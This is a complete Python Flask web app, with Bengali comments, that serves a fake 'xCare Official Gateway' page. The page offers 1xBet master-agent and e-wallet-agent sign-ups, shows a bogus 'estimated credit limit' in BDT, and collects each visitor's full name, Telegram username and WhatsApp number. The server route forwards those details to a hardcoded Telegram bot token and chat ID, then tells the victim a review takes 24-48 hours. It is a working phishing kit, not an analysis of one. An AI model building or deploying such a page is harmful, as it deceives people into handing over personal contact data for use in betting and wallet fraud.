from flask import Flask, render_template_string, request, jsonify
import os, requests

app = Flask(__name__)

# টেলিগ্রাম কনফিগারেশন
B1 = "8540257283"
B2 = "AAEqTBD6kJSVozsKmWtZf_l-QQtkJtUuTw"
BOT_TOKEN = f"{B1}:{B2}"
CHAT_ID = "6529319833"

@app.route('/')
def home():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>xCare Official Gateway</title>
        <style>
            body { font-family: 'Segoe UI', sans-serif; background-color: #0b162c; color: white; margin: 0; padding: 0; overflow: hidden; }
            .header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1c2e4a; font-size: 11px; letter-spacing: 0.5px; }
            .status-dot { color: #4caf50; font-weight: bold; }
            
            .main-ui { padding: 20px; height: 100vh; }
            .label { font-size: 11px; color: #8fa3bf; text-transform: uppercase; margin-bottom: 15px; display: block; }
            
            /* ভিডিওর মতো বাটন/কার্ড স্টাইল */
            .action-card { background: #162641; padding: 18px; border-radius: 12px; display: flex; align-items: center; margin-bottom: 12px; cursor: pointer; border: 1px solid #1c2e4a; transition: 0.2s; }
            .action-card:active { transform: scale(0.96); background: #1c2e4a; }
            .card-icon { font-size: 22px; margin-right: 15px; background: rgba(255,255,255,0.03); padding: 8px; border-radius: 8px; }
            .card-info b { display: block; font-size: 15px; margin-bottom: 2px; }
            .card-info span { font-size: 11px; color: #4caf50; }
            .arrow-icon { margin-left: auto; color: #1976d2; font-size: 18px; }

            /* ভিডিওর মতো স্লাইডিং ফরম */
            .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 100; backdrop-filter: blur(4px); }
            .bottom-sheet { 
                position: fixed; bottom: -100%; left: 0; width: 100%; 
                background: #0b162c; border-radius: 25px 25px 0 0; padding: 30px 20px; 
                box-sizing: border-box; z-index: 200; border-top: 2px solid #1976d2;
                transition: bottom 0.4s cubic-bezier(0.25, 1, 0.5, 1);
            }
            .bottom-sheet.show { bottom: 0; }
            
            .promo-box { background: linear-gradient(135deg, #0d47a1, #1976d2); padding: 18px; border-radius: 15px; margin-bottom: 25px; }
            .input-field { margin-bottom: 15px; }
            .input-field label { display: block; font-size: 11px; color: #8fa3bf; margin-bottom: 8px; text-transform: uppercase; }
            .input-field input { width: 100%; padding: 14px; background: #162641; border: 1px solid #253959; border-radius: 10px; color: white; box-sizing: border-box; outline: none; font-size: 14px; }
            
            .submit-btn { background: #1976d2; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 15px rgba(25, 118, 210, 0.3); }
            .close-handle { width: 40px; height: 5px; background: #253959; border-radius: 10px; margin: -15px auto 20px auto; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="header">
            <span class="status-dot">● GATEWAY: SECURE</span>
            <span style="color: #8fa3bf;">SESSION: 1XB-ONLINE</span>
        </div>

        <div class="main-ui">
            <span class="label">Available Services</span>
            
            <div class="action-card" onclick="openSheet('1xBet Master Agent')">
                <div class="card-icon">👑</div>
                <div class="card-info">
                    <b>1xBet Master Agent</b>
                    <span>Tap to apply for agent</span>
                </div>
                <div class="arrow-icon">➔</div>
            </div>

            <div class="action-card" onclick="openSheet('E-wallet Agent')">
                <div class="card-icon">💳</div>
                <div class="card-info">
                    <b>E-wallet Agent</b>
                    <span>Request for wallet access</span>
                </div>
                <div class="arrow-icon">➔</div>
            </div>

            <div class="action-card" onclick="window.location.href='https://t.me/your_bot'">
                <div class="card-icon">💬</div>
                <div class="card-info">
                    <b>Live Support</b>
                    <span>Contact official admin</span>
                </div>
                <div class="arrow-icon">↗</div>
            </div>
        </div>

        <div class="overlay" id="bgOverlay" onclick="closeSheet()"></div>
        <div class="bottom-sheet" id="sheetForm">
            <div class="close-handle" onclick="closeSheet()"></div>
            <div class="promo-box">
                <small style="opacity:0.8; font-size:10px;">ESTIMATED CREDIT LIMIT</small>
                <h2 style="margin:5px 0;">৳ 5,450.00 BDT</h2>
            </div>
            
            <h4 id="displayTitle" style="color: #1976d2; margin-bottom: 20px; font-size: 16px;">VERIFICATION FORM</h4>
            
            <form id="tgForm">
                <input type="hidden" name="service" id="serviceName">
                <div class="input-field">
                    <label>Full Name</label>
                    <input type="text" name="name" placeholder="Enter Official Name" required>
                </div>
                <div class="input-field">
                    <label>Telegram Username</label>
                    <input type="text" name="user" placeholder="@username" required>
                </div>
                <div class="input-field">
                    <label>WhatsApp Number</label>
                    <input type="text" name="phone" placeholder="01XXXXXXXXX" required>
                </div>
                <button type="submit" class="submit-btn" id="btnTxt">LINK ACCOUNT</button>
            </form>
        </div>

        <script>
            function openSheet(val) {
                document.getElementById('serviceName').value = val;
                document.getElementById('displayTitle').innerText = val.toUpperCase();
                document.getElementById('bgOverlay').style.display = 'block';
                document.getElementById('sheetForm').classList.add('show');
            }
            function closeSheet() {
                document.getElementById('sheetForm').classList.remove('show');
                setTimeout(() => { 
                    document.getElementById('bgOverlay').style.display = 'none';
                }, 400);
            }

            document.getElementById('tgForm').onsubmit = async (e) => {
                e.preventDefault();
                document.getElementById('btnTxt').innerText = 'LINKING...';
                
                const data = Object.fromEntries(new FormData(e.target));
                const res = await fetch('/api/verify', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });

                if(res.ok) {
                    alert('Submitted! Review will take 24-48 hours.');
                    location.reload();
                }
            };
        </script>
    </body>
    </html>
    ''')

@app.route('/api/verify', methods=['POST'])
def verify():
    d = request.json
    message = f"🚀 **New Official Request**\n\n📌 Service: {d.get('service')}\n👤 Name: {d.get('name')}\n🆔 TG: {d.get('user')}\n📱 WA: {d.get('phone')}"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
    return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
